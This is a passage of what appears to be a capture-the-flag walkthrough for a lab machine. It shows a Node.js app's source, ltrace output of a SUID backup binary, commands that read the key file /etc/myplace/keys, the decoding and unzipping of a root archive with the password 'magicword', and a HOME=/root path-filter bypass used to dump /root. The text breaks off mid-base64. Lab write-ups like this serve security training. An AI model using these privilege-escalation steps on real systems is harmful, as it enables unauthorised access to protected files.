\u0026#39;QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____. -~\u0026#34;\u0026#34;??9VWQQQQQQQQQQQQQQQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQQQQQP\\\u0026#39;_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,\u0026#34;?9$QQQQQQQQQQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQQW\\\u0026#39; jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ\u0026#39;, \u0026#39;QQQQQQQP\\\u0026#39;.yQQQQQQQQQQQP\u0026#34; \u0026lt;wa,.!4WQQQQQQQWdWP??!\u0026#34;??4WWQQQWQQc ?QWQQQQQ\u0026#39;, \u0026#39;QQQQQP\\\u0026#39;_a.\u0026lt;aamQQQW!\u0026lt;yF \u0026#34;!` .. \u0026#34;??$Qa\u0026#34;WQQQWTVP\\\u0026#39; \u0026#34;??\\\u0026#39; =QQmWWV?46/ ?QQQQQ\u0026#39;, \u0026#39;QQQP\\\u0026#39;sdyWQP?!`.-\u0026#34;?46mQQQQQQT!mQQgaa. \u0026lt;wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ\u0026#39;, \u0026#39;QQ[ j@mQP\\\u0026#39;adQQP4ga, -????\u0026#34; \u0026lt;jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?\u0026#34;` -?QzQ7L ]QQQ\u0026#39;, \u0026#39;QW jQkQ@ jWQQD\\\u0026#39;-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc \u0026#34;4QQQQa .QP4QQQQfWkl jQQQ\u0026#39;, \u0026#39;QE ]QkQk $D?` waa \u0026#34;?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`\u0026#34;QQQD\\Qf(.QWQQ\u0026#39;, \u0026#39;QQ,-Qm4Q/-QmQ6 \u0026#34;WWQma/ \u0026#34;??QQQQQQL 4W\u0026#34;- -?$QQQQWP`s,awT$QQQ@ \u0026#34;QW@?$:.yQQQQ\u0026#39;, \u0026#39;QQm/-4wTQgQWQQ, ?4WWk 4waac -???$waQQQQQQQQF??\\\u0026#39;\u0026lt;mWWWWWQW?^ ` ]6QQ\\\u0026#39; yQQQQQ\u0026#39;, \u0026#39;QQQQw,-?QmWQQQQw a, ?QWWQQQw _. \u0026#34;????9VWaamQWV???\u0026#34; a j/ ]QQf jQQQQQQ\u0026#39;, \u0026#39;QQQQQQw,\u0026#34;4QQQQQQm,-$Qa ???4F jQQQQQwc \u0026lt;aaas _aaaaa 4QW ]E )WQ`=QQQQQQQ\u0026#39;, \u0026#39;QQQQQQWQ/ $QQQQQQQa ?H ]Wwa, ???9WWWh dQWWW,=QWWU? ?! )WQ ]QQQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQc-QWQQQQQW6, QWQWQQQk \u0026lt;c jWQ ]QQQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQQ,\u0026#34;$WQQWQQQQg,.\u0026#34;?QQQQ\\\u0026#39;.mQQQmaa,., . .; QWQ.]QQQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQWQa ?$WQQWQQQQQa,.\u0026#34;?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQQWWma \u0026#34;9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQQQQQQQws \u0026#34;Tqau?9maZ?WQmaas,, --~-- --- . _ssawmQQQQQQk 3QQQQWQ\u0026#39;, \u0026#39;QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ\u0026#39;, \u0026#39;QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}\u0026lt;wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQQQQQQQQQQQQQQWWQQga,-\u0026#34;9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW\u0026#39;, \u0026#39;QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,. -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^\u0026#34;!???????!^`_saQWWQQQQQQQ\u0026#39;, \u0026#39;QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ\u0026#39;, \u0026#39;QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;\u0026lt;!-- \u0026#39; + randomString + \u0026#39; --\u0026gt;\u0026#39; ].join(\u0026#34;\\n\u0026#34;) ); } }); app.use(express.static(path.join(__dirname, \u0026#39;static\u0026#39;))); app.use(bodyParser.json()); app.use(function(err, req, res, next) { if (err) { res.status(err.status || 500); res.send({ message:\u0026#34;Uh oh, something went wrong!\u0026#34;, error: true }); } else { next(); } }); app.get(\u0026#39;/api/users/?\u0026#39;, function (req, res) { db.collection(\u0026#39;users\u0026#39;).find().toArray(function (error, docs) { if (error) { res.status(500).send({ error: true }); } else if (!docs) { res.status(404).send({ not_found: true }); } else { res.send(docs); } }); }); app.get(\u0026#39;/api/users/latest\u0026#39;, function (req, res) { db.collection(\u0026#39;users\u0026#39;).find({ is_admin: false }).toArray(function (error, docs) { if (error) { res.status(500).send({ error: true }); } else if (!docs) { res.status(404).send({ not_found: true }); } else { res.send(docs); } }); }); app.get(\u0026#39;/api/users/:username\u0026#39;, function (req, res) { db.collection(\u0026#39;users\u0026#39;).findOne({ username: req.params.username }, function (error, doc) { if (error) { res.status(500).send({ error: true }); } else if (!doc) { res.status(404).send({ not_found: true }); } else { res.send(doc); } }); }); app.get(\u0026#39;/api/session\u0026#39;, function (req, res) { if (req.session.user) { res.send({ authenticated: true, user: req.session.user }); } else { res.send({ authenticated: false }); } }); app.post(\u0026#39;/api/session/authenticate\u0026#39;, function (req, res) { var failureResult = { error: true, message: \u0026#39;Authentication failed\u0026#39; }; if (!req.body.username || !req.body.password) { res.send(failureResult); return; } db.collection(\u0026#39;users\u0026#39;).findOne({ username: req.body.username }, function (error, doc) { if (error) { res.status(500).send({ message:\u0026#34;Uh oh, something went wrong!\u0026#34;, error: true }); return; } if (!doc) { res.send(failureResult); return; } var hash = crypto.createHash(\u0026#39;sha256\u0026#39;); var cipherText = hash.update(req.body.password).digest(\u0026#39;hex\u0026#39;); if (cipherText == doc.password) { req.session.user = doc; res.send({ success: true }); } else { res.send({ success: false }) } }); }); app.get(\u0026#39;/api/admin/backup\u0026#39;, function (req, res) { if (req.session.user \u0026amp;\u0026amp; req.session.user.is_admin) { var proc = spawn(\u0026#39;/usr/local/bin/backup\u0026#39;, [\u0026#39;-q\u0026#39;, backup_key, __dirname ]); var backup = \u0026#39;\u0026#39;; proc.on(\u0026#34;exit\u0026#34;, function(exitCode) { res.header(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/plain\u0026#34;); res.header(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment; filename=myplace.backup\u0026#34;); res.send(backup); }); proc.stdout.on(\u0026#34;data\u0026#34;, function(chunk) { backup += chunk; }); proc.stdout.on(\u0026#34;end\u0026#34;, function() { }); } else { res.send({ authenticated: false }); } }); app.use(function(req, res, next){ res.sendFile(\u0026#39;app.html\u0026#39;, { root: __dirname }); }); app.listen(3000, function () { console.log(\u0026#39;MyPlace app listening on port 3000!\u0026#39;) }); });   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  backup -q testing /root backup -q /root backup testing testing /root --- ____________________________________________________ / \\  | _____________________________________________ | | | | | | | | | | | | | | | | | | | | | | | | | | | Secure Backup v1.0 | | | | | | | | | | | | | | | | | | | | | | | | | | | |_____________________________________________| | | | \\_____________________________________________________/ \\_______________________________________/ _______________________________________________ _-\u0026#39; .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-. --- `-_ _-\u0026#39;.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--. .-.-.`-_ _-\u0026#39;.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_ _-\u0026#39;.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_ _-\u0026#39;.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_ :-----------------------------------------------------------------------------: `---._.-----------------------------------------------------------------._.---\u0026#39; [!] Ah-ah-ah! You didn\u0026#39;t say the magic word!   ltrace  We can use ltrace to display calls that are made to shared libraries  1  ltrace backup testing testing /root   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  strncpy(0xff8251a8, \u0026#34;testing\u0026#34;, 100) = 0xff8251a8 strcpy(0xff825191, \u0026#34;/\u0026#34;) = 0xff825191 strcpy(0xff82519d, \u0026#34;/\u0026#34;) = 0xff82519d strcpy(0xff825127, \u0026#34;/e\u0026#34;) = 0xff825127 strcat(\u0026#34;/e\u0026#34;, \u0026#34;tc\u0026#34;) = \u0026#34;/etc\u0026#34; strcat(\u0026#34;/etc\u0026#34;, \u0026#34;/m\u0026#34;) = \u0026#34;/etc/m\u0026#34; strcat(\u0026#34;/etc/m\u0026#34;, \u0026#34;yp\u0026#34;) = \u0026#34;/etc/myp\u0026#34; strcat(\u0026#34;/etc/myp\u0026#34;, \u0026#34;la\u0026#34;) = \u0026#34;/etc/mypla\u0026#34; strcat(\u0026#34;/etc/mypla\u0026#34;, \u0026#34;ce\u0026#34;) = \u0026#34;/etc/myplace\u0026#34; strcat(\u0026#34;/etc/myplace\u0026#34;, \u0026#34;/k\u0026#34;) = \u0026#34;/etc/myplace/k\u0026#34; strcat(\u0026#34;/etc/myplace/k\u0026#34;, \u0026#34;ey\u0026#34;) = \u0026#34;/etc/myplace/key\u0026#34; strcat(\u0026#34;/etc/myplace/key\u0026#34;, \u0026#34;s\u0026#34;) = \u0026#34;/etc/myplace/keys\u0026#34; fopen(\u0026#34;/etc/myplace/keys\u0026#34;, \u0026#34;r\u0026#34;) = 0x98ff410 fgets(\u0026#34;a01a6aa5aaf1d7729f35c8278daae30f\u0026#34;..., 1000, 0x98ff410) = 0xff824d3f strcspn(\u0026#34;a01a6aa5aaf1d7729f35c8278daae30f\u0026#34;..., \u0026#34;\\n\u0026#34;) = 64 strcmp(\u0026#34;testing\u0026#34;, \u0026#34;a01a6aa5aaf1d7729f35c8278daae30f\u0026#34;...) = 1 fgets(\u0026#34;45fac180e9eee72f4fd2d9386ea7033e\u0026#34;..., 1000, 0x98ff410) = 0xff824d3f strcspn(\u0026#34;45fac180e9eee72f4fd2d9386ea7033e\u0026#34;..., \u0026#34;\\n\u0026#34;) = 64 strcmp(\u0026#34;testing\u0026#34;, \u0026#34;45fac180e9eee72f4fd2d9386ea7033e\u0026#34;...) = 1 fgets(\u0026#34;3de811f4ab2b7543eaf45df611c2dd25\u0026#34;..., 1000, 0x98ff410) = 0xff824d3f strcspn(\u0026#34;3de811f4ab2b7543eaf45df611c2dd25\u0026#34;..., \u0026#34;\\n\u0026#34;) = 64 strcmp(\u0026#34;testing\u0026#34;, \u0026#34;3de811f4ab2b7543eaf45df611c2dd25\u0026#34;...) = 1 fgets(\u0026#34;\\n\u0026#34;, 1000, 0x98ff410) = 0xff824d3f strcspn(\u0026#34;\\n\u0026#34;, \u0026#34;\\n\u0026#34;) = 0 strcmp(\u0026#34;testing\u0026#34;, \u0026#34;\u0026#34;) = 1 fgets(nil, 1000, 0x98ff410) = 0 strcpy(0xff823d78, \u0026#34;Ah-ah-ah! You didn\u0026#39;t say the mag\u0026#34;...) = 0xff823d78 printf(\u0026#34; %s[!]%s %s\\n\u0026#34;, \u0026#34;\\033[33m\u0026#34;, \u0026#34;\\033[37m\u0026#34;, \u0026#34;Ah-ah-ah! You didn\u0026#39;t say the mag\u0026#34;... [!] Ah-ah-ah! You didn\u0026#39;t say the magic word!    We can navigate into /etc/myplace/keys It is also making a comparison of the key we entered strcmp(\u0026ldquo;testing\u0026rdquo;, \u0026ldquo;a01a6aa5aaf1d7729f35c8278daae30f\u0026rdquo;\u0026hellip;) = 1  1 2 3 4 5 6  cat /etc/myplace/keys --- a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 ---   1 2 3  backup -q 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 /root # let\u0026#39;s try with the last key --- UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==   1  echo -n \u0026#34;UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==\u0026#34; | base64 -d \u0026gt; root.zip   1 2 3 4  unzip root.zip 7z e root.zip # [e] Extract files from archive  password: magicword   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  cat root.txt QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____. -~\u0026#34;\u0026#34;??9VWQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQP\u0026#39;_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,\u0026#34;?9$QQQQQQQQQQQQQQ QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ QQQQQQQQQQW\u0026#39; jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ QQQQQQQP\u0026#39;.yQQQQQQQQQQQP\u0026#34; \u0026lt;wa,.!4WQQQQQQQWdWP??!\u0026#34;??4WWQQQWQQc ?QWQQQQQ QQQQQP\u0026#39;_a.\u0026lt;aamQQQW!\u0026lt;yF \u0026#34;!` .. \u0026#34;??$Qa \u0026#34;WQQQWTVP\u0026#39; \u0026#34;??\u0026#39; =QQmWWV?46/ ?QQQQQ QQQP\u0026#39;sdyWQP?!`.-\u0026#34;?46mQQQQQQT!mQQgaa. \u0026lt;wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ QQ[ j@mQP\u0026#39;adQQP4ga, -????\u0026#34; \u0026lt;jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?\u0026#34;` -?QzQ7L ]QQQ QW jQkQ@ jWQQD\u0026#39;-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc\u0026#34;4QQQQa .QP4QQQQfWkl jQQQ QE ]QkQk $D?` waa \u0026#34;?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`\u0026#34;QQQD\\Qf(.QWQQ QQ,-Qm4Q/-QmQ6 \u0026#34;WWQma/ \u0026#34;??QQQQQQL 4W\u0026#34;- -?$QQQQWP`s,awT$QQQ@ \u0026#34;QW@?$:.yQQQQ QQm/-4wTQgQWQQ, ?4WWk 4waac -???$waQQQQQQQQF??\u0026#39;\u0026lt;mWWWWWQW?^ ` ]6QQ\u0026#39; yQQQQQ QQQQw,-?QmWQQQQw a, ?QWWQQQw _. \u0026#34;????9VWaamQWV???\u0026#34; a j/ ]QQf jQQQQQQ QQQQQQw,\u0026#34;4QQQQQQm,-$Qa???4F jQQQQQwc \u0026lt;aaas _aaaaa 4QW ]E )WQ`=QQQQQQQ QQQQQQWQ/ $QQQQQQQa?H ]Wwa, ???9WWWh dQWWW,=QWWU? ?! )WQ ]QQQQQQQ QQQQQQQQQc-QWQQQQQW6, QWQWQQQk \u0026lt;c jWQ ]QQQQQQQ QQQQQQQQQQ,\u0026#34;$WQQWQQQQg,.\u0026#34;?QQQQ\u0026#39;.mQQQmaa,., . .; QWQ.]QQQQQQQ QQQQQQQQQWQa ?$WQQWQQQQQa,.\u0026#34;?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ QQQQQQQQQQWWma \u0026#34;9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ QQQQQQQQQQQQQQQws \u0026#34;Tqau?9maZ?WQmaas,, --~-- --- . _ssawmQQQQQQk 3QQQQWQ QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}\u0026lt;wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ QQQQQQQQQQQQQQQQQQQQQQWWQQga,-\u0026#34;9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,. -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^\u0026#34;!???????!^`_saQWWQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ    No success  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  ltrace backup dsa testing /tmp strncpy(0xffc10e98, \u0026#34;testing\u0026#34;, 100) = 0xffc10e98 strcpy(0xffc10e81, \u0026#34;/\u0026#34;) = 0xffc10e81 strcpy(0xffc10e8d, \u0026#34;/\u0026#34;) = 0xffc10e8d strcpy(0xffc10e17, \u0026#34;/e\u0026#34;) = 0xffc10e17 strcat(\u0026#34;/e\u0026#34;, \u0026#34;tc\u0026#34;) = \u0026#34;/etc\u0026#34; strcat(\u0026#34;/etc\u0026#34;, \u0026#34;/m\u0026#34;) = \u0026#34;/etc/m\u0026#34; strcat(\u0026#34;/etc/m\u0026#34;, \u0026#34;yp\u0026#34;) = \u0026#34;/etc/myp\u0026#34; strcat(\u0026#34;/etc/myp\u0026#34;, \u0026#34;la\u0026#34;) = \u0026#34;/etc/mypla\u0026#34; strcat(\u0026#34;/etc/mypla\u0026#34;, \u0026#34;ce\u0026#34;) = \u0026#34;/etc/myplace\u0026#34; strcat(\u0026#34;/etc/myplace\u0026#34;, \u0026#34;/k\u0026#34;) = \u0026#34;/etc/myplace/k\u0026#34; strcat(\u0026#34;/etc/myplace/k\u0026#34;, \u0026#34;ey\u0026#34;) = \u0026#34;/etc/myplace/key\u0026#34; strcat(\u0026#34;/etc/myplace/key\u0026#34;, \u0026#34;s\u0026#34;) = \u0026#34;/etc/myplace/keys\u0026#34; fopen(\u0026#34;/etc/myplace/keys\u0026#34;, \u0026#34;r\u0026#34;) = 0x8307410    There is no filtering for “~” We can change that variable to /root  1  export HOME=/root   1 2 3  backup test 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 \u0026#34;~\u0026#34; or backup -q 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 \u0026#34;~\u0026#34;    Another base 64  1  echo \u0026#34;UEsDBAoAAAAAABwWO0sAAAAAAAAAAAAAAAAFABwAcm9vdC9VVAkAA4cDy1njyitidXgLAAEEAAAAAAQAAAAAUEsDBBQACQAIANGDEUd/sK5kgwAAAJQAAAANABwAcm9vdC8ucHJvZmlsZVVUCQADGf7RVePKK2J1eAsAAQQAAAAABAAAAADlUduimngZPcKLGxn6JghwMTV3BpMkPQD35HjGsgbIa0XNjNFgeZx08rPvzlKkPCfqwxuhAFLb2R0p2HwdwbOmtp9mT+BT372NZKAweN1Ui+r6qbcuINf6XcczupaJTmgMcVUxOTRXCB0jNyrdf+06NeBG8qxfXKQ9kl6hMZHHmGbsOlBLBwh/sK5kgwAAAJQAAABQSwMEFAAJAAgAHBY7S9xSZRxNAAAAVQAAABIAHAByb290Ly5iYXNoX2hpc3RvcnlVVAkAA4cDy1njyitidXgLAAEEAAAAAAQAAAAAXZ/Ka4WxwpvFLgEHpj58eLbtxBwfelVogd73JeN5mtNJWYVZ2GOludoCbOhyiaVcOA5A077XAG+hevBT6HjNvntsu3ONZ+hlhY7VSuJQSwcI3FJlHE0AAABVAAAAUEsDBAoAAAAAADR8I0sAAAAAAAAAAAAAAAAMABwAcm9vdC8uY2FjaGUvVVQJAAPDEqxZ48orYnV4CwABBAAAAAAEAAAAAFBLAwQKAAkAAAA0fCNLAAAAAAwAAAAAAAAAIAAcAHJvb3QvLmNhY2hlL21vdGQubGVnYWwtZGlzcGxheWVkVVQJAAPDEqxZ48orYnV4CwABBAAAAAAEAAAAAIjeARvR9gOhwy6QHVBLBwgAAAAADAAAAAAAAABQSwMECgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AHAByb290L3Jvb3QudHh0VVQJAAPQFaxZ48orYnV4CwABBAAAAAAEAAAAAGc5mwIcHawXvZyyOZvYRTKbgvHZNSyJ+tapiDdyaj+l+r0LZ+l9JG2NHtBc4FBLBwjyjjdALQAAACEAAABQSwMEFAAJAAgA65FWR73lED6bBQAAIgwAAAwAHAByb290Ly5iYXNocmNVVAkAA6kZKVbjyitidXgLAAEEAAAAAAQAAAAAgQBoCyZZ0VaXHVzqleDq/WbthUEHIvrZGZsWWARWxiBS0rZUh9RFIiGfsad0ODAkCemr9waEyJdrC2u5SavKYSBYjDFIHVL+7lWL6R92iAux6dM+m7g3zVYuWkWuVKFPuSfx